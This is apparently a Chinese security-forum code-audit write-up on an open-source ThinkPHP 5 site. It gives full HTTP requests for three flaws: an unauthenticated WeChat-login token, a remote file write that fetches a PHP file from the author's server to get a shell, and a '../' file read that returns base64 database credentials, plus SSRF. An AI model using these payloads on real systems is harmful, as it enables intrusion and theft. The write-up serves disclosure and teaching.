@@ -1,0 +1,176 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="23c69b9f876b7063fa98c0a22c596bb1">0x00 前言</h2>
+<p>学习php代码审计的前提是需要熟悉 php 的语法；对Model（数据模型）、Controller（业务逻辑）、View（视图）类似的模式有了解；对SQL 预编译、一些危险函数有了解。我曾花了一个月时间学习 php 语法、创建 thinkphp 站点有所了解，所以在 githb 上找了一个站点作为练手。以下问题均已提交 Github issue。</p>
+<p>代码审计可以分为两种手段：黑白盒。我们可以搭建站点后通过 AWVS 等扫描工具进行漏扫。也可以通过寻找危险函数来寻找那些可以获取权限的漏洞。这里个站点使用了一个比较小型的 waf，在我进行漏扫后没有发现什么漏洞。所以我直接采用了寻找危险函数可控点来发现严重的漏洞。</p>
+<h2 data-content="1" id="a209bed7eac179e8d5242e212c262300">0x01 环境说明</h2>
+<p>Apache 2.4.46</p>
+<p>MySQL 5.7.34</p>
+<p>PHP 7.4.21</p>
+<p>ThinkPHP 5.0.24</p>
+<h2 data-content="1" id="1b3a2bc7b22452ac9f97f4f7258c0f8f">0x02 漏洞挖掘 ｜ 远程文件上传 Getshell</h2>
+<h3 data-content="1" id="2231c4e22fd6771d149c8e40c5d26283">1.发现危险函数</h3>
+<p>通过全局搜索 fopen 这个打开文件的函数，发现了 api 下面存在一个 <code>path</code> 用变量来控制，极有肯能存在问题。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305123852-28a85aa2-9c3e-1.png"/></p>
+<p>双击后可以发现是一个 download_img 的函数，其中 <code>url</code> 和 <code>path</code> 变量是可控的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305123922-3a980e4c-9c3e-1.png"/></p>
+<p>这里直接使用 curl 访问了我们提供的 <code>url</code> 并且 <code>path</code> 也没有做任何过滤。直接读文件写到指定目录。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305123945-4856429c-9c3e-1.png"/></p>
+<p>直接构造路近请求但是提示 <code>token</code> 错误，下一步我们需要获得<code>token</code>。</p>
+<h3 data-content="1" id="58f52e7a4573ae2ae00db59b6b4b3b72">2.获取token</h3>
+<h4 data-content="1" id="becf7d69d7442ea65a3dd5c029d512f5">思路一、伪造 token</h4>
+<p><code>token</code> 获取的方式一般是通过登陆，不过我想知道 <code>token</code> 的构造看看尝试能不能直接伪造一段 <code>token</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124014-596d2d5c-9c3e-1.png"/></p>
+<p>在 <code>api</code> 中 <code>Login.php</code> 里发现登陆的入口</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124027-61814672-9c3e-1.png"/></p>
+<ol>
+<li>这里发现它使用 <code>this</code> 进行调用 <code>getLogic</code> 类内公开函数，往上找发现这个函数返回了一个新的 <code>UserLogic</code> 类对象。</li>
+<li>通过调用这个返回的对象 <code>login</code> 函数才能进一步知道执行了什么。</li>
+<li>再往上看发现 <code>UserLogic</code> 不是这个 <code>class Login</code> 的，而是继承 <code>Common</code> 父类。</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124045-6c1baeb0-9c3e-1.png"/></p>
+<p>在 <code>common</code> 里发现可以发现 <code>UserLogc.php</code> 里的 <code>login</code> 函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124059-74250296-9c3e-1.png"/></p>
+<ol>
+<li>往下看可以找到生成 <code>token</code> 的代码</li>
+<li>主体是这个生成的，这里使用了 <code>logic('Token')</code> 去获取类，我们跟进去就可以找到处理 <code>Token</code> 的文件。</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124114-7d1a0e1e-9c3e-1.png"/></p>
+<p>跟进 <code>logic</code> 函数可以发现这里执行了两个步骤：</p>
+<ol>
+<li>一个是拼接文件名，<code>class</code> 变量中使用传入的 <code>name</code> 变量进行拼接，我们拿到刚刚的 <code>'Token'</code> 可以推出变量为：<code>\app\common\logic\TokenLogic</code>
+</li>
+<li>直接通过 <code>new</code> 来生成 <code>TokenLogic</code> 对象</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124130-86e7c008-9c3e-1.png"/></p>
+<p>找到  <code>TokenLogic.php</code> 文件，进一步跟踪到 <code>getToken</code> 函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124236-ae11bdaa-9c3e-1.png"/></p>
+<p>往下看发现了 <code>token</code> 的构造是 <code>$type-$user_id-microtime</code> 其中 <code>microtime</code> 是获取的时间戳。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124252-b79d2a80-9c3e-1.png"/></p>
+<p>再往上看，有一个 <code>checkToken</code> 函数用于校验。<code>model</code> 是数据模型了，这里的意思是直接通过数据库查询传递的 <code>token</code> 是否匹配。这就导致即使我们伪造了 <code>token</code> 但是不在数据库那就不能通过。</p>
+<h4 data-content="1" id="f4ba4d55a215c97704007f984d1f68ef">思路二、间接获取 token</h4>
+<p>看源码可以知道，一定是要登陆才能调用到 <code>getToken</code> 。可以通过注册登陆的方式来获取，但是如果关闭了注册功能、注册功能失效，我们就没法获取 <code>token</code> 了。有没有不需要有账号密码即可获取 <code>token</code> 的方式？</p>
+<p>我们继续来看登陆功能的 <code>Login.php</code> 发现提供了一种不需要账号密码就可以登陆的方式。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124306-c00d001e-9c3e-1.png"/></p>
+<p>进一步跟进 <code>wxLogin</code> 函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124341-d5283202-9c3e-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124357-de58cbf2-9c3e-1.png"/></p>
+<ol>
+<li>折叠函数里包含了输入内容的校验，大概意思是用户不存在可以创建一个新的，这里我们可以不用管。</li>
+<li>通过了校验之后会生成新的 <code>token</code>
+</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124415-e9502690-9c3e-1.png"/></p>
+<p>我们直接构造数据包，填入需要的字段即可直接拿到生成的 <code>token</code>。</p>
+<h3 data-content="1" id="e9be7d7fcb799c4eefa923670e1ea2e7">3.漏洞复现</h3>
+<h4 data-content="1" id="e9a28f31e6d2b25e8e4067dbbc933d2c">1.获取 token</h4>
+<p>文件上传的接口需要 access_token ，我们可以通过下面这个接口获取</p>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/login/wx_login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">nbnbk:8888</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">46</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+
+openid=1&amp;unionid=1&amp;sex=1&amp;head_img=1&amp;nickname=1
+</pre></div>
+<p>可以在返回包中发现 token 已经生成</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124504-067e224e-9c3f-1.png"/></p>
+<h4 data-content="1" id="099209f182387424c0b83f0226d14890">2.在 vps 中启动 http 服务</h4>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">'&lt;?php phpinfo();'</span> &gt; index.php
+python -m http.server <span class="m">8099</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124530-16230e4e-9c3f-1.png"/></p>
+<h4 data-content="1" id="c1bb6ddc63b8e63aeed2888ff9e01cfd">3.文件上传</h4>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/User/download_img</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">nbnbk:8888</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">95</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+
+access_token=87b5fd1230df78dad5a62924426a9a6d&amp;url=http://127.0.0.1:8099/index.php&amp;path=info.php
+</pre></div>
+<p>这里的 access_token 就是上面获取的 token，url 是文件地址，path 是文件名</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124557-25f58a72-9c3f-1.png"/></p>
+<p>返回 200 表示成功，我们直接访问 <a href="http://nbnbk:8888/info.php" target="_blank">http://nbnbk:8888/info.php</a> 可以看到已经写入文件并能成功解析。如果有权限问题，可以考虑上传到 <code>uploads</code> 目录也可以执行。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124610-2dd1cff8-9c3f-1.png"/></p>
+<h2 data-content="1" id="1c8490ed09a89788a239ed43b1a4f8a4">0x03 漏洞挖掘 ｜ 任意文件读取</h2>
+<h3 data-content="1" id="733ff467980242d7adba6060275bdeab">1.漏洞分析</h3>
+<p>通过全局搜索危险函数 <code>file_get_contents</code> 可以找到一处 <code>api</code> 目录下的文件，这意味着我们可以构造请求。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124626-372ecc4a-9c3f-1.png"/></p>
+<p>查看代码我们可以知道，这里没有任何的防御。<code>file_get_contents</code> 函数的参数是可控的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124643-413535e4-9c3f-1.png"/></p>
+<p>这里将文件转成 <code>base64</code> 并通过 <code>chunk_split</code> 对数据进行了分割，这里没有其他参数，只是把换行进行了转码，格式为 <code>\r\n</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124700-4b80eed0-9c3f-1.png"/></p>
+<h3 data-content="1" id="5c1f6594f8424ba2f4f87c128900eb38">2.漏洞复现</h3>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/Index/getFileBinary</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">nbnbk:8888</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">31</span>
+
+url=../application/database.php
+</pre></div>
+<p>通过修改 <code>url</code> 参数来读取文件，来看返回数据。</p>
+<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 04 Mar 2022 03:39:37 GMT</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">Apache/2.4.46 (Unix) mod_fastcgi/mod_fastcgi-SNAP-0910052141 PHP/7.4.21 OpenSSL/1.0.2u mod_wsgi/3.5 Python/2.7.13</span>
+<span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.21</span>
+<span class="na">Access-Control-Allow-Origin</span><span class="o">:</span> <span class="l">*</span>
+<span class="na">Access-Control-Allow-Methods</span><span class="o">:</span> <span class="l">GET,POST</span>
+<span class="na">Access-Control-Allow-Headers</span><span class="o">:</span> <span class="l">x-requested-with,content-type,x-access-token,x-access-appid</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">2784</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
+
+{"code":0,"msg":"操作成功","data":"PD9waHAKLy8gKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t\r\nLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLy8gfCBUaGlua1BIUCBbIFdFIENBTiBETyBJVCBKVVNU\r\nIFRISU5LIF0KLy8gKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t\r\nLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLy8gfCBDb3B5cmlnaHQgKGMpIDIwMDZ+MjAxNiBo\r\ndHRwOi8vdGhpbmtwaHAuY24gQWxsIHJpZ2h0cyByZXNlcnZlZC4KLy8gKy0tLS0tLS0tLS0tLS0t\r\nLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0K\r\nLy8gfCBMaWNlbnNlZCAoIGh0dHA6Ly93d3cuYXBhY2hlLm9yZy9saWNlbnNlcy9MSUNFTlNFLTIu\r\nMCApCi8vICstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t\r\nLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIHwgQXV0aG9yOiBsaXUyMXN0IDxsaXUyMXN0QGdtYWls\r\nLmNvbT4KLy8gKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t\r\nLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi8vIOaVsOaNruW6k+mFjee9ruaWh+S7tgoKcmV0dXJu\r\nIFsKICAgIC8vIOaVsOaNruW6k+exu+WeiwogICAgJ3R5cGUnICAgICAgICAgICA9PiAnbXlzcWwn\r\nLAogICAgLy8g5pyN5Yqh5Zmo5Zyw5Z2ACiAgICAnaG9zdG5hbWUnICAgICAgID0+ICcxMjcuMC4w\r\nLjEnLAogICAgLy8g5pWw5o2u5bqT5ZCNCiAgICAnZGF0YWJhc2UnICAgICAgID0+ICduYm5iaycs\r\nCiAgICAvLyDnlKjmiLflkI0KICAgICd1c2VybmFtZScgICAgICAgPT4gJ3Jvb3QnLAogICAgLy8g\r\n5a+G56CBCiAgICAncGFzc3dvcmQnICAgICAgID0+ICdwYXNzQCExMjMnLAogICAgLy8g56uv5Y+j\r\nCiAgICAnaG9zdHBvcnQnICAgICAgID0+ICc4ODg5JywKICAgIC8vIOi\/nuaOpWRzbgogICAgJ2Rz\r\nbicgICAgICAgICAgICA9PiAnJywKICAgIC8vIOaVsOaNruW6k+i\/nuaOpeWPguaVsAogICAgJ3Bh\r\ncmFtcycgICAgICAgICA9PiBbXSwKICAgIC8vIOaVsOaNruW6k+e8lueggem7mOiupOmHh+eUqHV0\r\nZjgKICAgICdjaGFyc2V0JyAgICAgICAgPT4gJ3V0ZjgnLAogICAgLy8g5pWw5o2u5bqT6KGo5YmN\r\n57yACiAgICAncHJlZml4JyAgICAgICAgID0+ICdmbF8nLAogICAgLy8g5pWw5o2u5bqT6LCD6K+V\r\n5qih5byPCiAgICAnZGVidWcnICAgICAgICAgID0+IGZhbHNlLAogICAgLy8g5pWw5o2u5bqT6YOo\r\n572y5pa55byPOjAg6ZuG5Lit5byPKOWNleS4gOacjeWKoeWZqCksMSDliIbluIPlvI8o5Li75LuO\r\n5pyN5Yqh5ZmoKQogICAgJ2RlcGxveScgICAgICAgICA9PiAwLAogICAgLy8g5pWw5o2u5bqT6K+7\r\n5YaZ5piv5ZCm5YiG56a7IOS4u+S7juW8j+acieaViAogICAgJ3J3X3NlcGFyYXRlJyAgICA9PiBm\r\nYWxzZSwKICAgIC8vIOivu+WGmeWIhuemu+WQjiDkuLvmnI3liqHlmajmlbDph48KICAgICdtYXN0\r\nZXJfbnVtJyAgICAgPT4gMSwKICAgIC8vIOaMh+WumuS7juacjeWKoeWZqOW6j+WPtwogICAgJ3Ns\r\nYXZlX25vJyAgICAgICA9PiAnJywKICAgIC8vIOaYr+WQpuS4peagvOajgOafpeWtl+auteaYr+WQ\r\npuWtmOWcqAogICAgJ2ZpZWxkc19zdHJpY3QnICA9PiB0cnVlLAogICAgLy8g5pWw5o2u6ZuG6L+U\r\n5Zue57G75Z6LIGFycmF5IOaVsOe7hCBjb2xsZWN0aW9uIENvbGxlY3Rpb27lr7nosaEKICAgICdy\r\nZXN1bHRzZXRfdHlwZScgPT4gJ2FycmF5JywKICAgIC8vIOaYr+WQpuiHquWKqOWGmeWFpeaXtumX\r\ntOaIs+Wtl+autQogICAgJ2F1dG9fdGltZXN0YW1wJyA9PiBmYWxzZSwKICAgIC8vIOaYr+WQpumc\r\ngOimgei\/m+ihjFNRTOaAp+iDveWIhuaekAogICAgJ3NxbF9leHBsYWluJyAgICA9PiBmYWxzZSwK\r\nICAgIC8v5Y+W5raI5YmN5Y+w6Ieq5Yqo5qC85byP5YyWCiAgICAnZGF0ZXRpbWVfZm9ybWF0Jz0+\r\nIGZhbHNlLApdOwo=\r\n"}
+</pre></div>
+<p>文件信息在 <code>data</code> 字段中，是 <code>base64</code> 编码的格式，但其中包含了大量的 <code>\r\n</code> 导致我们没法直接解码。我们可以通过 <code>js</code> 去将所有 <code>\r\n</code> 删掉。</p>
+<ol>
+<li>
+<p>打开 Google Chrome 游览器</p>
+</li>
+<li>
+<p>打开一个控制台</p>
+</li>
+<li>输入以下代码</li>
+</ol>
+<pre><code>a = "$data string"
+a.replaceAll('\r\n', '')</code></pre>
+<p>演示将上面代码进行转化</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124723-594d58f0-9c3f-1.png"/></p>
+<p>将转化后的数据进行 <code>base64</code> 转码 我使用的是 <code>Google Chrome</code> 插件 <code>FeHelper</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124759-6ee4165e-9c3f-1.png"/></p>
+<p>该漏洞还可以成为有回显的 <code>SSRF</code>。</p>
+<p>我在和站点同一服务器下搭建了一个 <code>php</code> 的 <code>web</code> 服务，其中首页是输出一段文字。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124816-78c66eec-9c3f-1.png"/></p>
+<p>通过接口访问可以获得内网服务信息。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124846-8ab9bf46-9c3f-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124843-8924ba78-9c3f-1.png"/></p>
+<h2 data-content="1" id="f838a246d1a0e7d7a2b0272a74b30050">0x04 漏洞挖掘 ｜ SSRF 漏洞</h2>
+<h3 data-content="1" id="84794bd682ba98164ec540ea77a158cc">1.漏洞分析</h3>
+<p>通过直接搜索 <code>curl_exec</code> 函数，发现一个可控的 <code>curl url</code> 参数。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124902-93ea5a62-9c3f-1.png"/></p>
+<p>具体看一下函数，发现是做远程上传文件的功能，既然 <code>url</code> 可控，那就可以做 <code>ssrf</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124919-9e214d10-9c3f-1.png"/></p>
+<p>构造一下数据包，其中 <code>file</code> 要求 <code>array</code> 的形式 <code>file[tmp_name]=1</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124945-ada9d540-9c3f-1.png"/></p>
+<p>这里发送请求之后提示500，但是服务器的请求已经发送了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305124959-b5fc9ba6-9c3f-1.png"/></p>
+<h3 data-content="1" id="e219619ba4bf3e2550a113a3e6820fd0">2.漏洞复现</h3>
+<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/Image/curl_upload_image</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">nbnbk:8888</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">68</span>
+
+url=http://127.0.0.1:8088&amp;file[tmp_name]=1&amp;file[type]=1&amp;file[name]=1
+</pre></div>
+<p>替换 <code>url</code> 来进行 <code>SSRF</code> 攻击，该漏洞没有回显。发送请求后可以看到服务器已经向外请求了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220305125139-f18959de-9c3f-1.png"/></p>
+<h2 data-content="1" id="5d2c81eb3aeada9504097a3c4f38550a">总结</h2>
+<p>这里的代码审计我并没有过多关注逻辑漏洞的问题，反而更加关注能直接获取主机权限的漏洞。目的其实很明确，找到可以构造的输入点，对输入点的绕过，执行我们想要执行的危险函数拿到我们想要的数据。</p>
+<blockquote>
+<p>"一切存在用户输入的地方都有可能存在漏洞"。</p>
+</blockquote>
+</div>
+</div>
